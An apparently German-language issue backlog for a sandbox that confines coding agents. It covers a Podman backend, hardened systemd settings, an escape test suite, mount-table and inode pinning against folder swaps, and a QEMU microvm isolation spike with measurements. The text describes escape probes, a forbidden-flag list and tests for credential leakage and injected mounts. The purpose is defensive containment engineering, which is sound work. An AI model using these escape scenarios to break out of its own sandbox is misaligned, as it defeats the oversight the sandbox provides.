8. `tools/coupling-baseline.toml` bekommt `[podman]`, `tools/check_coupling.py` zählt `podman`, `crun`, `krun`, `libkrun`, `conmon` außerhalb von `src/podman/`.
9. `docs/SECURITY.md` bekommt den Abschnitt „Linux: Podman" mit den drei Garantien in der gemeinsamen Stufe; `docs/THREAT-MODEL.md` einen K-Eintrag für die Container-Engine (Podman, `conmon`, Speicher des Nutzers, `containers.conf`).
10. Der Adapter liest die Gruppe, die HUM-431 angelegt hat, und `config_readers.rs` stuft jeden ihrer Schlüssel als `effective` ein: `sandbox.podman.program`, `sandbox.podman.runtime` (nur `crun`; `krun` lehnt bis HUM-444 mit `SANDBOX_048` ab), `sandbox.podman.memory_mib` (`--memory`; leer: die Hälfte des Arbeitsspeichers des Hosts, höchstens 4096 MiB), `sandbox.podman.cpus` (`--cpus`; leer: die Hälfte der CPUs, die der Daemon nutzen darf, mindestens 1, höchstens 4), `sandbox.podman.pids_limit` (`--pids-limit`), `sandbox.podman.start_timeout_secs` (Frist bis zum Bericht), `sandbox.podman.rootfs` und `sandbox.podman.image` (bis HUM-439 lehnt `rootfs = "image"` den Start mit `Diagnostic` ab, statt still `host` zu nehmen).

### Tests
- Unit `plan.rs`: die Zeile enthält jedes feste Flag genau einmal und kein `-e`, kein `-t`, kein `--privileged`, kein `--network` außer `none`, kein `--cap-add`, kein `--device`, kein `:z`/`:Z`; eine Tabelle prüft das gegen eine Verbotsliste.
- Unit: jedes Profil mit `extra_rw` erzeugt genau einen beschreibbaren Bind außer `/work`; Masken nur für vorhandene Pfade, fehlende stehen in `unprotected`.
- Integration (übersprungen ohne `podman`, mit Grund): Sitzung startet, `CHECK`-Zeilen alle `ok`, Exit-Status 7 kommt als 7 an, `kill` hinterlässt keinen Container (`podman ps -a --filter label=...` leer).
- Integration: Daemon-Prozess mit `SIGKILL` beendet, Container weg nach `KILL_GRACE` plus Startfrist (Lebensleine).
- Integration: Daemon mit `HTTPS_PROXY=http://user:pw@proxy.invalid:3128` in der eigenen Umgebung; weder die Umgebung des Agenten (`/proc/<agent>/environ` über den Bericht) noch `podman inspect` des laufenden Containers enthält `user:pw` oder `proxy.invalid`.
- Integration: ein Eintrag in `~/.config/containers/mounts.conf` (im Test über ein eigenes `HOME`) und eine `volumes`-Zeile in `CONTAINERS_CONF_OVERRIDE` erscheinen nicht im Container, kein `/run/secrets`; ein Hook im Hook-Verzeichnis des Nutzers läuft nicht.
- Integration am PTY: Agent mit Terminal, Größenänderung kommt an (`stty size`), `humanitl sandbox attach` mit Detach und erneutem Attach, zweite Shell über `humanitl sandbox exec` mit eigenem Terminal und dem Filter des Agenten (`socket(AF_UNIX)` verweigert).
- Mutationsbeweis: `--network none` entfernt färbt `no_interfaces` rot; ein zusätzlicher Socket-Bind färbt `single_socket` rot; `Teardown::Container` durch `Process` ersetzt färbt den Kill-Test rot; `--http-proxy=false` entfernt färbt den Proxy-Variablen-Test rot; `default_mounts_file` entfernt färbt den `mounts.conf`-Test rot (solange die Mounttabellen-Prüfung aus HUM-437 fehlt; danach färbt sie ihn mit `SANDBOX_049` rot).

### Akzeptanzkriterien
1. Über `detect_unadmitted` (Integrationstests, `escape-launch`) läuft eine Sitzung mit Terminal, Attach, Detach, Größenänderung und weiteren Shells wie unter bwrap. Für Nutzer bleibt Podman mit `SANDBOX_048` gesperrt (HUM-448).
2. Fehlt eine Voraussetzung, startet nichts, und der Code nennt sie; kein Rückfall auf bwrap.
3. Kein Umgebungswert in `argv`, `podman inspect` oder unter `~/.local/share/containers`.
4. Kopplungszahlen außerhalb von `src/podman/` steigen nicht.

### Fallstricke
- Ein Mountpunkt, den es in `/work` nicht gibt, legt crun im Projekt an; deshalb Masken nur auf vorhandenen Pfaden, genau wie `present_under_work` unter bwrap.
- `--rm` und ein Kill-Pfad, der selbst `rm -f` ruft, laufen gegeneinander; ein „no such container" beim Aufräumen ist Erfolg.
- `--userns keep-id` und `--read-only` verlangen, dass `/home/agent` und `/tmp` aus dem Profil als tmpfs kommen; die Wurzel bleibt unbeschreibbar.
- Der Daemon läuft unter der Nutzer-Unit; bis HUM-434 ist der Pfad nur in Tests außerhalb der Unit geprüft. Das steht im Commit-Body.

## HUM-434 · Podman unter der gehärteten Nutzer-Unit

### Kontext
`packaging/systemd/humanitld.service` setzt unter anderem `PrivateUsers=yes`, `ProtectSystem=strict`, `ProtectControlGroups=yes`, `NoNewPrivileges=yes`, `CapabilityBoundingSet=CAP_SYS_ADMIN`, `ProtectProc=invisible`, `RestrictFileSystems`, `PrivateIPC`, `PrivateMounts` und einen Syscall-Filter. Rootless Podman braucht Schreibzugriff auf seinen Speicher, `newuidmap` und `newgidmap` (die `CAP_SETUID` und `CAP_SETGID` brauchen, die `NoNewPrivileges` und die Begrenzungsmenge nehmen) und eine cgroup. Messung P8 läuft mit jeder Eigenschaft der echten Unit, aus der Datei erzeugt, und lässt dann je eine weg.

### Spezifikation
1. Nach dem Ergebnis von P8 genau eine der zwei Lösungen, mit der Begründung im Commit: (a) Unit-Eigenschaften gezielt gelockert, nur was P8 als nötig belegt, oder (b) Start von Podman über den systemd-Manager des Nutzers, wenn (a) die Härtung des Daemons zu weit öffnet; bei (b) bekommt der Shim seine Deskriptoren über die Tür statt über `--preserve-fds`, und die Frage geht vorher an den Inhaber (HUM-292, Frage 2).
2. `docs/SECURITY.md` Abschnitt „Service hardening" nennt jede gelockerte Eigenschaft und warum; `docs/THREAT-MODEL.md` passt den Eintrag des Daemons an.
3. ADR-0010 bekommt den Nachtrag zur Unit (der Rest des Nachtrags kommt in HUM-441).

### Tests
- `packaging/systemd`-Test (vorhanden für die Unit): die erwarteten Eigenschaften stehen in der Datei; ein Test sieht jede gelockerte Eigenschaft im Abschnitt „Service hardening" von `docs/SECURITY.md` genannt.
- Manuell, im Commit-Body: Daemon als Unit, Sitzung mit `--backend podman` startet und endet sauber.

### Akzeptanzkriterien
1. Eine Sitzung mit Podman startet aus der App unter der installierten Unit.
2. bwrap-Sitzungen laufen unverändert; keine Eigenschaft wird für bwrap gelockert, die nur Podman braucht, wenn (a) das getrennt ausdrücken kann.

### Fallstricke
- `ReadWritePaths` auf `~/.local/share/containers` gibt dem Daemon Schreibzugriff auf alle Abbilder des Nutzers; das ist eine Aussage in `docs/SECURITY.md`, nicht nur eine Zeile in der Unit.
- `NoNewPrivileges` entwaffnet `newuidmap` mit Datei-Capabilities; ohne untergeordnete IDs fällt `--userns keep-id` weg, und das ist dann `SANDBOX_039`, kein stiller Wechsel der Abbildung.

## HUM-435 · Escape-Suite je Backend und CI-Job `escape-tests-podman`

### Kontext
Ein Backend ist erst zulässig, wenn `tests/escape/` gegen es grün ist (BACKLOG.md 9.1). Die Suite startet heute über `BwrapBackend` (`daemon/crates/sandbox/src/bin/escape-launch.rs:308, 410`).

### Spezifikation
1. `escape-launch` nimmt `--backend <name>` und nutzt `Backend::detect_unadmitted`, damit die Suite eine Stufe vor ihrer Zulassung prüfen kann; `tests/escape/run.sh` liest `HUMANITL_ESCAPE_BACKEND` (Vorgabe `bwrap`) und reicht ihn durch.
2. Jede Probe läuft gegen jedes Backend. Proben, die bwrap-Eigenheiten voraussetzen (etwa die Flags in `/proc/1/cmdline`), bekommen eine Fassung je Backend; keine Probe entfällt.
3. Neue Proben für Podman in ESC-2: kein `/run/.containerenv`-Inhalt außer dem erwarteten, kein Socket von `conmon` in der Sandbox, `/proc/1/status` zeigt `Seccomp: 2` für den Shim.
4. CI-Job `escape-tests-podman` auf `ubuntu-24.04`, gleiche Schritte und Urteilslogik wie `escape-tests`, plus `podman --version` und `podman info` als Beleg (P16); Pfadregeln in `tools/ci-changes.sh` (HUM-424); `ci-ok` verlangt ihn.

### Tests
- Die Suite selbst; `selftest.sh` um einen Lauf mit `HUMANITL_ESCAPE_BACKEND=podman` gegen eine Attrappe ergänzt.
- Mutationsbeweis in der CI dokumentiert (einmalig, im Commit-Body mit Lauf-ID): `--network none` im Adapter entfernt färbt ESC-1 rot; ein zweiter Socket-Bind färbt ESC-2 rot.

### Akzeptanzkriterien
1. `escape-tests-podman` ist grün mit null übersprungenen Proben, die bwrap grün hat.
2. Ein Lauf, der Podman nicht starten kann, ist `error`, nie `pass` oder `skip`.
3. `docs/SECURITY.md` Abschnitt 9 nennt den neuen Job; `docs/THREAT-MODEL.md` trägt ESC-1 und ESC-2 als Prüfung beim K-Eintrag der Container-Engine ein.

### Fallstricke
- Auf dem Runner ist Podman 4.9; ein Feature aus Podman 5 im Adapter macht den Job rot, nicht gelb.
- Der Job braucht dieselbe AppArmor-Freigabe für Nutzer-Namensräume wie `escape-tests`.

## HUM-436 · `doctor` je Backend mit Probestart

### Kontext
`doctor` prüft heute bwrap (`daemon/crates/sandbox/src/doctor/probe.rs:52, 233`, `doctor/checks.rs`). Mit zwei Backends fragt er jedes, und für das gewählte macht er auf Wunsch einen Probestart.

### Spezifikation
1. Prüfzeilen je Backend aus `Backend::detect` und den Voraussetzungen aus HUM-433, jede mit `ok`, `warn` oder `fail`, `why` und `fix`.
2. `humanitl doctor --probe` startet je verfügbarem Backend einen leeren Container mit dem Shim (`true` als Befehl) und prüft die fünf `CHECK`-Zeilen; das Ergebnis wird mit den Werkzeugversionen zwischengespeichert, bis sich eine Version ändert. Scheitern: `DOCTOR_014`.
3. Die Oberfläche (`app/lib/core/domain/doctor.dart`) zeigt die Zeilen gruppiert nach Backend; Texte über ARB.
4. Eine nicht zugelassene Stufe zeigt `doctor` als `warn` mit `SANDBOX_048` („noch nicht zugelassen") und den statischen Prüfzeilen aus `detect`; `--probe` startet für sie nichts und meldet für diese Stufe `SANDBOX_048`. Der Probestart läuft nur für zugelassene Stufen; `doctor` ruft `detect_unadmitted` nie auf (es ist dort nicht einmal gebaut, HUM-431).

### Tests
- Unit: Zwischenspeicher ungültig bei anderer Podman-Version.
- Unit: vor HUM-448 liefert `doctor --probe` für `podman` `SANDBOX_048` und startet keinen Prozess (Attrappe für `podman` zählt Aufrufe: null).
- Integration (übersprungen ohne Podman): Probestart grün; mit falschem `sandbox.podman.program` `fail` mit `SANDBOX_034`.
- Mutationsbeweis: der Cache-Schlüssel ohne Version färbt den Unit-Test rot.

### Akzeptanzkriterien
1. `humanitl doctor` nennt für jedes Backend, ob es nutzbar ist und was fehlt.
2. Der Probestart ist nicht Teil von `SandboxBackends` (HUM-432) und läuft nur auf Wunsch.

### Fallstricke
- `os_release.rs` liefert den Installationsbefehl; für Podman gehören `podman` und `uidmap` dazu.

## HUM-437 · Mounttabelle gleich Plan, geprüfte Ordner nach dem Einhängen belegt, Masken nur auf vorhandenen Pfaden

### Kontext
bwrap hängt Deskriptoren ein (HUM-263, `--bind-fd`), ein Tausch nach der Prüfung erreicht die Sandbox nicht. Podman nimmt Pfade und löst sie später in einem anderen Prozess auf. Außerdem kann eine Konfigurationsquelle von Podman Einhängungen hinzufügen (`mounts.conf`, `/run/secrets`), die keine Sockets tragen und deshalb an der Socket-Suche von Garantie 2 vorbeigehen. HUM-292-Ergebnis Abschnitte 3 und 5; Messungen P9, P13, P14.

### Spezifikation
1. Der Plan trägt für `/work`, jeden Eintrag aus `mounts.ro`, `extra_ro`, `extra_rw` und das Agentenprogramm (HUM-278) das Paar Gerät und Inode des geöffneten Deskriptors.
2. Der Plan trägt außerdem die erwartete Mounttabelle als Multimenge von Einträgen (Einhängepunkt, Dateisystemtyp, Quelle, `ro`/`rw`, `nosuid`, `nodev`, `noexec`; Quelle bei einem Bind Gerät und Inode, sonst der Typ), mit der Anzahl je Eintrag: jeder Bind, jedes tmpfs und jede Maske des Profils, dazu die eigenen Einträge des Backends. Für Podman mit `--read-only-tmpfs=false` stehen sie in der Tabelle im HUM-292-Ergebnis Abschnitt 3 (`/proc` mit maskierten Pfaden und schreibgeschützten Selbst-Binds, `/dev` mit `/dev/pts`, `/dev/mqueue`, `/dev/shm` und den Gerätedateien, `/sys`, `/sys/fs/cgroup`, `/run/.containerenv`, `/etc/hostname`, `/etc/resolv.conf`), jeder Eintrag „zu prüfen in P17"; die Liste im Code ist die gemessene. Bei bwrap dessen eigene.
3. Beides bekommt der Shim über eine eigene Option `--pins-fd <n>`, einen versiegelten memfd mit JSON, für jedes Backend gleich; damit braucht bwrap, das die Umgebung weiter über `--setenv` trägt (`EnvDelivery::Argv`), keinen Umgebungs-memfd. Vor dem `exec` des Agenten vergleicht der Shim (a) `/proc/self/mountinfo` als Multimenge mit der erwarteten Tabelle, Eintrag für Eintrag samt Typ, Quelle und Optionen; ein zusätzlicher, fehlender oder abweichender Eintrag, auch ein zweiter auf einem erwarteten Einhängepunkt gestapelter, ist `CHECK mounts_match FAIL` und beim Daemon `SANDBOX_049`; (b) `stat` jedes Ziels mit Gerät und Inode, eine Abweichung ist `CHECK mounts_pinned FAIL` und `SANDBOX_042` mit Pfad, erwartetem und gefundenem Paar. Beide enden mit `EXIT_SETUP`, der Agent startet nicht.
4. Belegt P13, dass `/proc/self/fd/N` als Quelle den geöffneten Ordner einhängt, nutzt der Plan zusätzlich diesen Weg; sonst nur den Vergleich, und `docs/SECURITY.md` sagt „erkannt und abgelehnt" statt „verhindert".
5. Unter bwrap vergleicht der Shim genauso; dort sind beide Zeilen im Normalfall `ok`, und die Prüfung ist je Backend dieselbe.
6. `isolation_check` ordnet `mounts_match` und `mounts_pinned` der Garantie 2 zu (genau eine Tür heißt auch: keine Einhängung außerhalb des Plans).

### Tests
- Integration (übersprungen ohne Podman): Ordner nach `plan` und vor `launch` umbenannt und durch einen anderen ersetzt; Start scheitert mit `SANDBOX_042`, der Agent startet nicht.
- Unit: Abweichung nur im Inode, nur im Gerät, beides: jeweils `FAIL`.
- Unit Shim: eine `mountinfo` mit einem zusätzlichen Einhängepunkt (`/run/secrets`), eine mit einem fehlenden (`/work/.git/hooks`), eine mit einem `rw` statt `ro` und eine mit falschem Typ ergeben `mounts_match FAIL`.
- Integration gegen beide Backends (Podman übersprungen ohne Podman): ein zweiter Mount auf einem erwarteten Ziel, ein `tmpfs` über `/work` und ein Bind über `PROXY_SOCKET_DST` (Testargument, das den Plan um den Mount erweitert, nicht um die Erwartung), wird mit `SANDBOX_049` abgelehnt.
- Integration (übersprungen ohne Podman): ohne `--read-only-tmpfs=false` (Testargument) erscheinen `/run`, `/tmp`, `/var/tmp` als zusätzliche tmpfs und der Start scheitert mit `SANDBOX_049`.
- Integration (übersprungen ohne Podman): ein `mounts.conf`-Eintrag des Nutzers, an `default_mounts_file` vorbei erzwungen (Testargument, das die Datei des Daemons weglässt), wird mit `SANDBOX_049` abgelehnt.
- Mutationsbeweis: der Inode-Vergleich im Shim auf „immer gleich" gesetzt färbt den Tauschtest rot; der Mounttabellen-Vergleich auf „immer gleich" gesetzt färbt den `mounts.conf`-Test rot; der Vergleich als Menge der Ziele statt als Multimenge färbt den Stapel-Test rot.

### Akzeptanzkriterien
1. Kein Agent startet in einem Ordner, der nicht der geprüfte ist; Beleg durch den Tauschtest.
2. ESC-2 bekommt eine Probe für den Tausch und eine für eine zusätzliche Einhängung, gegen beide Backends.
3. `docs/SECURITY.md` Abschnitt 3 nennt die Mounttabellen-Prüfung; `docs/THREAT-MODEL.md` passt K-01 und K-05 für Podman an und nennt die Konfigurationsquellen von Podman beim K-Eintrag der Container-Engine.

### Fallstricke
- Ein Bind behält die Gerätenummer der Quelle (P14); unter einem Overlay (HUM-438) gilt das für `/work` nicht, dort greift die Regel aus HUM-438.
- Das Agentenprogramm ist eine Datei; `stat` folgt keinem Symlink (`AT_SYMLINK_NOFOLLOW`).

## HUM-438 · Podman: Wegwerf-Sandbox mit eigener oberer Schicht

### Kontext
HUM-350 und HUM-357: Unter bwrap liegt das Projekt nur lesbar unter einem Overlay, die obere Schicht auf tmpfs im Laufzeitverzeichnis; `disposable/scan.rs` und `apply.rs` lesen sie nach dem Ende. Podman kennt Overlay-Volumes mit eigener oberer Schicht (`:O,upperdir=,workdir=`). Messung P10.

### Spezifikation
1. `disposable_support` des Podman-Adapters: Kernel-Overlay (kein `fuse-overlayfs`), Laufzeitverzeichnis auf tmpfs, Projekt schreibbar eingehängt; sonst `SANDBOX_030` bei `disposable`, `SANDBOX_033` mit Grund bei `auto`.
2. `/work` als `-v <projekt>:/work:O,upperdir=<upper>,workdir=<work>`, Verzeichnisse aus `Layer::create`, Größe über `SizeGuard` (`SANDBOX_032`).
3. Scan, Diff, `apply`, `discard` unverändert; die obere Schicht wird erst nach dem Ende des Containers gelesen.
4. Pinning der unteren Schicht nach dem Ergebnis von P10 und P13 (HUM-292-Ergebnis Abschnitt 6); ist keins von beiden belegt, lehnt `disposable` unter Podman mit `SANDBOX_030` ab und nennt den Grund.

### Tests
- Integration (übersprungen ohne Podman): Änderung, Neuanlage, Löschung von Datei, Verzeichnis und Symlink erscheinen in `sandbox changes` mit der richtigen Art; das Projekt bleibt unverändert, bis `apply`.
- ESC-5 „ein Wegwerf-Lauf schreibt nie ins Projekt" läuft gegen Podman.
- Mutationsbeweis: `:O` durch einen schreibbaren Bind ersetzt färbt ESC-5 rot.

### Akzeptanzkriterien
1. `auto` ist unter Podman `disposable`, wo das System es kann, sonst `direct` mit `SANDBOX_033`; `disposable` fällt nie zurück.
2. Masken gelten in der Schicht wie unter bwrap.
3. `docs/SECURITY.md` 5.2 nennt Podman; `docs/THREAT-MODEL.md` K-24 nennt das Overlay-Volume von Podman als zweite Form der oberen Schicht.

### Fallstricke
- Podman legt eigene Dateien in `workdir` an; der Scan liest nur `upperdir`.
- Mit `fuse-overlayfs` sehen Whiteouts anders aus; nicht unterstützen, ablehnen.

### Umsetzung (2026-11-12)
Punkt 4 entschieden: keins von beiden belegt. P10 nachgemessen (Podman 5.8.6, Kernel 7.3.3,
Kernel-Overlay trotz installiertem `fuse-overlayfs`): Mit dem Projektpfad als untere Schicht
funktioniert das Volume (`mountinfo`: `overlay ... lowerdir=<pfad>,upperdir=..,workdir=..,
redirect_dir=nofollow,uuid=on,userxattr`, Schreiben landet in `upperdir`, Projekt unverändert),
aber Whiteouts und `workdir/work` (Modus `000`) gehören der untergeordneten Kennung 100000, und
das Verwerfen scheitert mit `SANDBOX_031`. Mit `/proc/self/fd/N` als untere Schicht scheitert
`crun` mit `Invalid argument`, wie P13. Ein `lowerdir` als Text in `mountinfo` lässt sich im
Container nicht an den geprüften Ordner binden. Darum lehnt `disposable` unter Podman mit
`SANDBOX_030` samt Grund ab, `auto` läuft direkt mit `SANDBOX_033`; ESC-5 prüft die Ablehnung.
Die Akzeptanzkriterien 1 und 3 gelten in dieser Form, 2 entfällt mangels Schicht.

## HUM-439 · Podman: Abbild als Wurzeldateisystem, mit Digest, ohne Pull beim Start

### Kontext
Der Inhaber will Sitzungen mit vorinstallierten Agenten und Werkzeugen. Unter Podman trägt ein OCI-Abbild sie. HUM-292-Ergebnis Abschnitt 7.

### Spezifikation
1. `rootfs = "image"` mit `image = "name@sha256:..."`. Vor jedem Start `podman image inspect` gegen den Digest; fehlt das Abbild oder weicht der Digest ab: `SANDBOX_043` mit `fix` „`humanitl sandbox image pull <ref>`".
2. Neues CLI-Kommando und RPC-Fall (`Sandbox`-Anfrage `ImagePull`), das ausdrücklich zieht; CLI und Oberfläche sagen vorher, dass das Ziehen das Netz direkt nutzt und nicht durch den Proxy läuft.
3. Die Binds aus dem Profil (`mounts.ro`) gelten im Abbild nicht; Projekt, Tür, CA, Shim, Adapterdateien und Sitzungsverzeichnis kommen wie in HUM-433 vom Host, nie aus dem Abbild.
4. Die Vorschau zeigt den Digest; die Tabelle nennt die Wurzel „Abbild".

### Tests
- Unit: `image` ohne `@sha256:` ist `CONFIG_003`.
- Integration (übersprungen ohne Podman): Abbild mit anderem Digest unter demselben Namen: Start mit `SANDBOX_043` abgelehnt, nichts gezogen.
- Mutationsbeweis: die Digest-Prüfung entfernt färbt den Integrationstest rot.

### Akzeptanzkriterien
1. Kein Start zieht ein Abbild; nur `image pull` tut es, auf Anforderung des Nutzers.
2. Ein CA-Zertifikat, ein Schlüssel oder ein Sitzungsverzeichnis steht nie in einem Abbild; ESC-2 prüft, dass die CA im Container vom Host kommt (Gerät und Inode).
3. `docs/SECURITY.md` nennt das Abbild als Teil der Vertrauensbasis; `docs/THREAT-MODEL.md` bekommt einen K-Eintrag für Abbild und Ziehen (Herkunft, Digest, direkter Netzzugriff beim Ziehen).

### Fallstricke
- Ein Agent vom Host, als Datei in ein Abbild gebunden, findet seine Bibliotheken vielleicht nicht; die Meldung nennt das (`AGENT_005` wie bisher).

## HUM-448 · Podman zulassen: die gemeinsame Stufe wird wählbar

### Kontext
Bis hier lehnt jeder Start mit `podman` als `SANDBOX_048` ab (HUM-431); Escape-Suite und Tests starten es über `detect_unadmitted`. Die Zulassung ist ein eigener, kleiner Commit, damit sie erst landet, wenn alles, was die Garantien unter Podman belegt, auf `main` ist.

### Spezifikation
1. Voraussetzung, im Commit-Body mit Lauf-ID belegt: `escape-tests-podman` grün auf `main` mit HUM-437 (Mounttabelle und Pinning) und HUM-438; HUM-434 und HUM-436 gelandet.
2. `ADMITTED_BACKENDS` bekommt `podman` mit der Laufzeit `crun`; `krun` bleibt gesperrt.
3. `SandboxBackends` meldet `podman` als verfügbar, wenn `detect` es ist; `auto` bleibt bwrap.
4. `docs/SECURITY.md` Abschnitt „Linux: Podman" verliert den Hinweis „noch nicht zugelassen"; `docs/THREAT-MODEL.md` setzt den K-Eintrag der Container-Engine auf `mitigated` mit ESC-1, ESC-2, ESC-5.
5. Nach einem Wunsch über den Start (`cli_overrides` mit `sandbox.backend`, HUM-432) werden die Obergrenzen aus dem Host auf der zusammengeführten Konfiguration erneut geprüft, nicht nur beim Laden des Daemons.

### Tests
- Unit: `sandbox.backend = "podman"` startet (mit Attrappe), `podman` mit `runtime = "krun"` scheitert weiter mit `SANDBOX_048`.
- Der Zulassungstest aus HUM-431 wird umgedreht: er erwartet jetzt `podman` in der Liste und `krun` nicht.

### Akzeptanzkriterien
1. `humanitl run --backend podman` und die Einstellung starten eine Sitzung; die Oberfläche kann es ab HUM-440.
2. Der Commit ändert keine Zeile außerhalb der Zulassungsliste, ihrer Tests und der zwei Sicherheitsdokumente.

### Fallstricke
- Nicht vor einem grünen `escape-tests-podman` auf genau dem Stand von `main`, auf dem der Commit aufsetzt.

## HUM-440 · Oberfläche: Backend-Wahl mit Isolationsstufe in Einstellungen und Start

### Kontext
Der Inhaber will die Wahl auch in der Oberfläche. ADR-0018: UI ist dünner Client; alles kommt aus `SandboxBackends` (HUM-432).

### Spezifikation
1. Einstellungen: Auswahl `sandbox.backend` mit je einem Satz zur Stufe („gemeinsamer Kernel, Namensräume" oder „eigener Kernel in einer Micro-VM") und, bei nicht verfügbaren Backends, dem `why` und `fix` aus dem RPC; Schreiben über `SetConfig`.
2. Start einer Sitzung: Backend für diese Sitzung wählbar (`cli_overrides`), Vorgabe der Einstellung; die Untergrenze des Projekts wird angezeigt und schränkt die Liste ein.
3. Sandbox-Bildschirm zeigt Backend und Stufe der laufenden Sitzung.
4. Was nicht zugelassen ist (`SANDBOX_048`), zeigt die Oberfläche nicht als Wahl; `podman` erscheint nach HUM-448, die Kernel-Stufe (seit HUM-442 `qemu`) erst mit HUM-447.
5. Texte über ARB (`en` Quelle, `de` Übersetzung), nur eigener Abschnitt, angehängt.

### Tests
- Widget: nicht verfügbares Backend ist nicht wählbar und zeigt den Grund; ein Backend unter der Untergrenze ebenso.
- Widget mit Fake: Wahl schreibt `SetConfig` mit `sandbox.backend`.
- Golden für die Auswahl in hell und dunkel.

### Akzeptanzkriterien
1. Keine Prüfung in Dart, die nicht aus dem RPC kommt.
2. Bildschirmfoto im Commit-Body, Designprüfung vor dem Landen (Wunsch des Inhabers vom 2026-11-01).

### Fallstricke
- `flutter test` läuft als Android; plattformabhängige Teile mit `TargetPlatformVariant`.
- `app/l10n/*.arb` ist gemeinsam genutzt: neu einlesen, nur anhängen.

## HUM-441 · Doku: Podman in README, CONFIG, cli; Nachträge ADR-0002, ADR-0010, ADR-0015; ADR-0020 angenommen

### Kontext
Die Sicherheitsdokumente wachsen mit dem Code (HUM-430, HUM-433, HUM-434, HUM-437 bis HUM-439). Was übrig bleibt, ist die Zusammenschau.

### Spezifikation
1. `README.md`: zwei Sätze zu den Stufen beider Backends.
2. `docs/cli.md`: `sandbox backends`, `--backend`, `--podman-runtime`, `sandbox image pull`.
3. Nachträge: ADR-0002 (Podman statt Docker als zweites Linux-Backend), ADR-0010 (`podman` und `uidmap` als `Recommends` im `.deb`, nie `Depends`; Unit nach HUM-434), ADR-0015 (Port-Tabelle: `bwrap`, `seatbelt`, `podman`).
4. ADR-0020 auf `Accepted` (nach HUM-448), `docs/adr/check.sh` und Index nachgezogen.
5. `packaging/deb/control.in`: `Recommends` ergänzt.

### Tests
- `bash scripts/ci/lint-docs.sh`, `python3 scripts/ci/check-doc-links.py`, `docs/adr/check.sh --self-test`.

### Akzeptanzkriterien
1. Jede Aussage über Podman in README und Website ist durch Code und `docs/SECURITY.md` gedeckt.
2. Das Paket installiert ohne Podman und funktioniert mit bwrap.

### Fallstricke
- `README.md` hat zwölf Pflichtabschnitte in fester Reihenfolge (`lint-docs.sh`).

## HUM-442 · Spike Kernel-Stufe: Weiterleitung, vsock-Tür, Kanäle des VMM, Startzeit, KVM in der CI

### Kontext
Die Kernel-Stufe sollte Podman mit der Laufzeit `krun` sein. libkrun ist in Debian nicht paketiert; der Inhaber hat am 2026-11-13 entschieden, dass die Stufe nur aus Paketen der Distribution entsteht: QEMU `-M microvm` mit virtiofsd und vhost-device-vsock, Podman nur noch für OCI-Abbilder. Der Spike prüft, ob dieser Weg die drei Garantien trägt. Kippt er eine davon, stoppt die Kernel-Stufe und geht zurück an den Inhaber.

### Spezifikation
1. Messen, mit Root im Gast und ohne Filter: Netzgeräte im Gast, Tür über genau einen vsock-Port, fremde CIDs und Ports abgewiesen, Kanäle des VMM, Pinning des Projektordners über virtiofs, Inodes, Modulsperre, Startzeit, alles unter einer gehärteten transienten Unit des Nutzers.
2. Entscheidung als ADR-0021, Nachtrag in ADR-0020, beide auch auf Deutsch; die Issues HUM-443 bis HUM-449 neu geschnitten.

### Tests
- Keine im Repository; Belege sind die Ausgaben unten. Der Prototyp liegt außerhalb von `main`.

### Akzeptanzkriterien
1. Jede Frage aus Punkt 1 hat einen Beleg oder ist mit Grund offen.
2. ADR-0021 nennt den Weg, die verworfenen Alternativen und die Folgen.

### Ergebnis (2026-11-13)

Referenzmaschine: Debian forky/sid, Kernel 7.3.4+deb14-amd64, i7-8550U mit VT-x, Nutzer in der Gruppe `kvm`. Pakete: `qemu-system-x86` 11.1.3, `virtiofsd` 1.14.0, `vhost-device-vsock` 0.3.0, `bubblewrap` 0.13.1. Gast: der laufende Kernel des Hosts, `init` ein statisches Testprogramm als Root ohne seccomp, die Wurzel ein von bwrap zusammengesetztes, nur lesbares `/usr` über virtiofs, `/work` ein Testordner über einen zweiten virtiofsd.

Startzeile von QEMU in den Messläufen Q1 bis Q7 (gekürzt auf das, was zählt; dort mit `-nographic -serial stdio` und `console=ttyS0`, damit die Ausgabe des Gasts lesbar ist, also mit der Konsole als Kanal zum Host; die Endform ohne Konsole steht unter Q8):

```
qemu-system-x86_64 -M microvm,pcie=on,acpi=on -accel kvm -cpu host -smp 1 -m 512 \
  -no-reboot -nodefaults -no-user-config -nographic -nic none \
  -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny \
  -object memory-backend-memfd,id=mem,size=512M,share=on -machine memory-backend=mem \
  -kernel /boot/vmlinuz-$(uname -r) -append "rootfstype=virtiofs root=rootfs ro init=/init" \
  -chardev socket,id=fs0,path=$R/root.sock -device vhost-user-fs-pci,chardev=fs0,tag=rootfs \
  -chardev socket,id=fs1,path=$R/work.sock -device vhost-user-fs-pci,chardev=fs1,tag=work \
  -chardev socket,id=vs,path=$R/vsock.sock -device vhost-user-vsock-pci,chardev=vs
```

QEMU, beide virtiofsd und vhost-device-vsock liefen je in einem bwrap-Gefängnis mit `--unshare-all --cap-drop ALL`, QEMU mit `--dev-bind /dev/kvm /dev/kvm` und `/boot` nur lesbar; vhost-device-vsock mit `--guest-cid 3 --uds-path $R/door --groups s442`, auf dem Host ein Lauscher nur an `$R/door_5000`.

| # | Frage | Beleg |
|---|---|---|
| Q1 | Netzgerät im Gast? | `/sys/class/net`: nur `lo`. `connect` nach `1.1.1.1:443`: `errno=101 Network is unreachable` |
| Q2 | Genau ein vsock-Port? | CID 2 Port 5000: `connect ok`, Antwort `door-reply:hello-door` vom Host-Socket. CID 2 Port 5001, CID 2 Port 22, CID 1 Port 5000, CID 4 Port 5000: je `errno=110 Connection timed out`, keine Verbindung |
| Q3 | Kanäle des VMM? | `/proc/<qemu>/fd` im Messlauf mit Konsole: `/dev/kvm`, `kvm-vm`, `kvm-vcpu:0`, `kvm-vcpu-stats:0`, 23 eventfd, 2 io_uring, 1 signalfd, 4 Unix-Sockets (vhost-user), `/dev/null`, ein gelöschtes memfd, dazu die Standardausgabe als Konsole (`-serial stdio`). Kein `/dev/vhost-vsock`, kein `/dev/net/tun`, kein tap. Die Endform (Q8) hat keine Konsole |
| Q4 | Erreicht ein nach der Prüfung vertauschter Projektordner den Gast? | Nein. Ordner geöffnet (`exec 7<project`), dann umbenannt und durch einen neuen ersetzt; virtiofsd in bwrap mit `--bind-fd 7 /share` und `--shared-dir /share --sandbox none`: der Gast sieht `pin` mit Inode 377185, dem geöffneten Ordner; der neue trägt 377774. Ohne bwrap scheitert `--shared-dir /proc/self/fd/7 --sandbox namespace` mit `OpenNewRoot ... No such file or directory` |
